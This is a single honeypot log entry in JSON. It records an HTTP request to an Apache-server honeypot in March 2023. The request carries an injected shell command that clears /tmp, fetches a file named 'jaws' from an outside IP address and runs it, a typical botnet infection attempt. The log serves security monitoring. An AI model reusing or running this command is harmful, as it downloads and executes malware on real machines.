{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"honeypot","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"Thu Mar  2 05:15:01 UTC 2023","parsedMessage":{"timestamp":"2023-03-02 05:14:32+00:00","message_type":"http-access","correlation_id":null,"level":"WARNING","message":"198.98.58.108 - - \"GET /shell?cd+/tmp;rm+-rf+*;wget+ 107.6.255.132/jaws;sh+/tmp/jaws\" 400 0 \"-\" \"-\"","ip":"198.98.58.108"},"id":"29bad909-2295-4709-b833-72899aec1d6c","EventProcessedUtcTime":"2023-03-02T05:15:02.1060089Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-02T05:15:01.9070000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/198.98.58.108"}